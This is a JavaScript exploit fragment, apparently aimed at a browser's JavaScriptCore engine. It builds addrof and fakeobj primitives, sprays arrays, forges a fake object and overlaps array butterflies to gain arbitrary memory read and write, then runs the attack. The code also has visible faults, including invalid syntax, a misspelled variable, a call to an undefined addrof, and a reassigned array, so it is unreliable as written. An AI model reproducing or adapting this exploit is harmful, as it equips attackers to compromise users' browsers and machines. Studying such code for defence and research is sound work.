// addrof primitive
function addrof2(obj) {
    boxed[0] = obj;
    return unboxed[0];
}

// fakeobj primitive
function fakeobj(addr) {
    unboxed[0] = addr;
    return unboxed[0];
}

// Launch attack
function pwn() {
    // Fill an array we are going to spray with arrays with an element & property,
    // specifically doubles (important! because we can use raw doubles to represent
    // pointers)
    var structure_spray[];
    for(var i = 0; i < 1000; i++) {
        var arr = [13.37];
        arr.a = 13.37;
        arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
        structure_spray_spray.push(arr)
    }

    // Pick a victim, any victim (seriously, any in the middle-ish)
    var victim = structure_spray[444];

    // Create some new arrays to do memory manipulation on, one 32 bit, the other 64.
    var convert = new ArrayBuffer(0x10);
    var u32 = new Uint32Array(convert);
    var f64 = new Float64Array(convert);

    // Setup flag values for ArrayWithDouble & ArrayWithContiguous
    u32[0] = 0x200; 
    u32[1] = 0x01082007 - 0x10000;
    var flag_dbl = f64[0];
    u32[1] = 0x01082009 - 0x10000;
    var flag_cnt = u32[0];

    // Create a placeholder object. Outer because it will be the "outer" of hax
    var outer = {
        cell_header: flag_cnt,
        butterfly: victim,
    };

    // Create our custom-crafted hax object
    // hax: cellheader of ArrayWithContiguous, butterfly is victim
    f64[0] = addrof(outer);
    u32[0] += 0x10;
    var hax = fakeobj(f64[0]);

    // Create and point boxed and unboxed to random locations
    // Their contents aren't important, only their types
    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    var boxed = [{}];

    // To start off with, hax[1] = victim[1], meaning that hax & victim point to the same location
    // First, overwrite the butterfly of victim[] and hax[], forcing them to point to metadata of unboxed
    // Second, get the butterfly of unboxed through victim[], and save it
    // Third, force victim[]/hax[] to point to boxed metadata, making victim[1] the bfly of
    // Fourth and finally, force boxed and unboxed to point to the same butterfly, making them access the same array
    // 
    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
    // and then access them as objects with boxed[]
    hax[1] = unboxed;
    var tmp_bfly_ptr = victim[1];
    hax[1] = boxed;
    victim[1] = tmp_bfly_ptr;
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
        ws_log.send("Connection closed!");
        ws_log.close();
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});